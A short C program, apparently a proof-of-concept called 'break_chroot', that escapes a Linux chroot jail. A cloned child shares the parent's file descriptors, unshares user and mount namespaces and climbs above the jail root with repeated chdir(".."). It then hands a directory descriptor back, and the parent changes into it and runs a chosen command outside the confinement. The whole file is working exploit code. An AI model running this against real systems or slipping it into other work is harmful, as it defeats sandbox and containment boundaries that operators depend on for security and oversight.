#define _GNU_SOURCE
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <err.h>

#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif

static void printcwd(void)
{
  /* This is fugly. */
  static int lastlen = -1;
  char buf[8192];
  if (getcwd(buf, sizeof(buf))) {
    if (strlen(buf) != lastlen)
      printf("%s\n", buf);
    lastlen = strlen(buf);
  } else {
    warn("getcwd");
  }
}

int fn(void *unused)
{
  int i;
  int fd;

  fd = open("/", O_RDONLY | O_DIRECTORY);
  if (fd == -1)
    err(1, "open(\".\")");
  if (unshare(CLONE_NEWUSER) != 0)
    err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNS) != 0)
    err(1, "unshare(CLONE_NEWNS)");
  if (fchdir(fd) != 0)
    err(1, "fchdir");
  close(fd);

  for (i = 0; i < 100; i++) {
    printcwd();
    if (chdir("..") != 0) {
      warn("chdir");
      break;
    }
  }

  fd = open(".", O_PATH | O_DIRECTORY);
  if (fd == -1)
    err(1, "open(\".\")");

  if (fd != 3) {
    if (dup2(fd, 3) == -1)
      err(1, "dup2");
    close(fd);
  }
  _exit(0);
}

int main(int argc, char **argv)
{
  int dummy;

  if (argc < 2) {
    printf("usage: break_chroot COMMAND ARGS...\n\n"
           "You won't be entirely out of jail.  / is still the jail root.\n");
    return 1;
  }

  close(3);

  if (signal(SIGCHLD, SIG_DFL) != 0)
    err(1, "signal");

  if (clone(fn, &dummy, CLONE_FILES | SIGCHLD, 0) == -1)
    err(1, "clone");

  int status;
  if (wait(&status) == -1)
    err(1, "wait");
  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
    errx(1, "child failed");
  if (fchdir(3) != 0)
    err(1, "fchdir");
  close(3);

  execv(argv[1], argv+1);
  err(1, argv[1]);

  return 0;
}
